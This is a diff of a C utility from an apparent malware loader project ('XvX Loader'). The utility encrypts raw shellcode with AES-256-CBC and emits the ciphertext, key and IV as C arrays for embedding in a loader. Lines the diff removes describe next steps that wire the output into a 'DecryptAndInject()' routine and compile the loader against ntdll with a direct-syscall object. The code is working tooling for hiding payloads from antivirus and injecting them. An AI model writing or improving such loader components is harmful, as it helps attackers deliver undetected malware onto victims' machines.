@@ -1,36 +1,10 @@
 /*
- * ============================================================================
- * TOOL: PAYLOAD ENCRYPTION UTILITY
- * ============================================================================
- * 
- * Author: XvX Loader Project
- * Date: 2025-11-13
- * 
- * This tool encrypts a shellcode file using AES-256-CBC encryption.
- * It generates random key and IV, then outputs:
- *   1. Encrypted shellcode as C array
- *   2. Key as C array
- *   3. IV as C array
- * 
- * COMPILATION:
- * ------------
- * gcc encrypt_payload.c ../modules/crypto.c -o encrypt_payload.exe -lAdvapi32
- * 
- * USAGE:
- * ------
- * encrypt_payload.exe <input_file>
- * 
- * Example:
- * encrypt_payload.exe ../payload/shellcode.bin
- * 
- * OUTPUT:
- * -------
- * Creates 3 files in ../payload/:
- *   - shellcode_aes.bin (encrypted shellcode)
- *   - shellcode_aes.txt (C array format for copy/paste)
- *   - key_iv.txt (key and IV in C array format)
- * 
- * ============================================================================
+ * Author: 28zaakypro@proton.me
+ * AES-256-CBC shellcode encryptor — outputs encrypted bin, C array, and key/IV files
+ *
+ * Compile: gcc encrypt_payload.c ../modules/crypto.c -o encrypt_payload.exe -lAdvapi32
+ * Usage:   encrypt_payload.exe <shellcode.bin>
+ * Output:  payload/shellcode_aes.bin, payload/shellcode_aes.txt, payload/key_iv.txt
  */
 
 #include "../modules/crypto.h"
@@ -39,18 +13,8 @@
 
 void PrintUsage(const char *progName)
 {
-    printf("Usage: %s <shellcode_file>\n", progName);
-    printf("\n");
-    printf("Encrypts a shellcode file using AES-256-CBC.\n");
-    printf("\n");
-    printf("Example:\n");
-    printf("  %s ../payload/shellcode.bin\n", progName);
-    printf("\n");
-    printf("Output files:\n");
-    printf("  - ../payload/shellcode_aes.bin (encrypted binary)\n");
-    printf("  - ../payload/shellcode_aes.txt (C array format)\n");
-    printf("  - ../payload/key_iv.txt (key and IV)\n");
-    printf("\n");
+    printf("Usage: %s <shellcode_file>\n\n", progName);
+    printf("Output: payload/shellcode_aes.bin, payload/shellcode_aes.txt, payload/key_iv.txt\n");
 }
 
 BOOL ReadFile_Custom(const char *filename, BYTE **data, SIZE_T *size)
@@ -152,12 +116,6 @@ void WriteCArrayToFile(const char *filename, const char *varName, const BYTE *da
 
 int main(int argc, char *argv[])
 {
-    printf("\n");
-    printf("╔═══════════════════════════════════════════════════════════════╗\n");
-    printf("║        XvX LOADER - AES-256 PAYLOAD ENCRYPTION TOOL          ║\n");
-    printf("╚═══════════════════════════════════════════════════════════════╝\n");
-    printf("\n");
-
     if (argc != 2)
     {
         PrintUsage(argv[0]);
@@ -166,9 +124,7 @@ int main(int argc, char *argv[])
 
     const char *inputFile = argv[1];
 
-    // ========================================================================
-    // STEP 1: READ SHELLCODE
-    // ========================================================================
+    // Read shellcode
     printf("[*] Reading shellcode from: %s\n", inputFile);
 
     BYTE *plainShellcode = NULL;
@@ -180,56 +136,19 @@ int main(int argc, char *argv[])
     }
 
     printf("[+] Shellcode loaded: %zu bytes\n", shellcodeSize);
-    printf("    First 16 bytes: ");
-    for (SIZE_T i = 0; i < (shellcodeSize < 16 ? shellcodeSize : 16); i++)
-    {
-        printf("%02X ", plainShellcode[i]);
-    }
-    printf("\n\n");
 
-    // ========================================================================
-    // STEP 2: GENERATE RANDOM KEY AND IV
-    // ========================================================================
-    printf("[*] Generating random AES-256 key and IV...\n");
-
+    // Generate key and IV
     BYTE key[AES_256_KEY_SIZE];
     BYTE iv[AES_IV_SIZE];
 
-    if (!GenerateRandomKey(key))
+    if (!GenerateRandomKey(key) || !GenerateRandomIV(iv))
     {
-        printf("[-] Failed to generate key\n");
+        printf("[-] Key/IV generation failed\n");
         free(plainShellcode);
         return EXIT_FAILURE;
     }
 
-    if (!GenerateRandomIV(iv))
-    {
-        printf("[-] Failed to generate IV\n");
-        free(plainShellcode);
-        return EXIT_FAILURE;
-    }
-
-    printf("[+] Key generated (32 bytes):\n    ");
-    for (int i = 0; i < AES_256_KEY_SIZE; i++)
-    {
-        printf("%02X ", key[i]);
-        if ((i + 1) % 16 == 0)
-            printf("\n    ");
-    }
-    printf("\n");
-
-    printf("[+] IV generated (16 bytes):\n    ");
-    for (int i = 0; i < AES_IV_SIZE; i++)
-    {
-        printf("%02X ", iv[i]);
-    }
-    printf("\n\n");
-
-    // ========================================================================
-    // STEP 3: ENCRYPT SHELLCODE
-    // ========================================================================
-    printf("[*] Encrypting shellcode with AES-256-CBC...\n");
-
+    // Encrypt
     BYTE *encryptedShellcode = NULL;
     DWORD encryptedSize = 0;
 
@@ -240,17 +159,10 @@ int main(int argc, char *argv[])
         return EXIT_FAILURE;
     }
 
-    printf("[+] Encryption successful!\n");
-    printf("    Original size:  %zu bytes\n", shellcodeSize);
-    printf("    Encrypted size: %lu bytes (including PKCS#7 padding)\n", encryptedSize);
-    printf("    Padding added:  %lu bytes\n\n", encryptedSize - shellcodeSize);
+    printf("[+] Encrypted: %zu -> %lu bytes (+%lu padding)\n",
+           shellcodeSize, encryptedSize, encryptedSize - (DWORD)shellcodeSize);
 
-    // ========================================================================
-    // STEP 4: SAVE ENCRYPTED SHELLCODE
-    // ========================================================================
-    printf("[*] Saving encrypted shellcode...\n");
-
-    // Binary file
+    // Save encrypted binary
     if (!WriteFile_Custom("payload/shellcode_aes.bin", encryptedShellcode, encryptedSize))
     {
         free(plainShellcode);
@@ -259,14 +171,9 @@ int main(int argc, char *argv[])
     }
     printf("[+] Binary saved: payload/shellcode_aes.bin\n");
 
-    // C array file (for easy copy/paste into loader.c)
     WriteCArrayToFile("payload/shellcode_aes.txt", "encryptedShellcode", encryptedShellcode, encryptedSize);
 
-    // ========================================================================
-    // STEP 5: SAVE KEY AND IV
-    // ========================================================================
-    printf("[*] Saving key and IV...\n");
-
+    // Save key and IV
     FILE *keyIvFile = fopen("payload/key_iv.txt", "w");
     if (keyIvFile)
     {
@@ -296,20 +203,8 @@ int main(int argc, char *argv[])
         fprintf(keyIvFile, "// Original shellcode size: %zu bytes\n", shellcodeSize);
 
         fclose(keyIvFile);
-        printf("[+] Key and IV saved: ../payload/key_iv.txt\n");
+        printf("[+] Key and IV saved: payload/key_iv.txt\n");
     }
-
-    printf("\n");
-    printf("╔═══════════════════════════════════════════════════════════════╗\n");
-    printf("║                    ENCRYPTION COMPLETE                        ║\n");
-    printf("╚═══════════════════════════════════════════════════════════════╝\n");
-    printf("\n");
-    printf("Next steps:\n");
-    printf("  1. Copy contents of ../payload/shellcode_aes.txt into loader_v3.c\n");
-    printf("  2. Copy key and IV from ../payload/key_iv.txt into loader_v3.c\n");
-    printf("  3. Update DecryptAndInject() to use DecryptPayload() instead of XOR\n");
-    printf("  4. Compile loader with: gcc -O0 loader_v3.c modules/*.c modules/dosyscall.o -o output/Loader_AES.exe -ladvapi32 -lntdll -luser32\n");
-    printf("\n");
 
     // Cleanup
     SecureZeroMemory(plainShellcode, shellcodeSize);
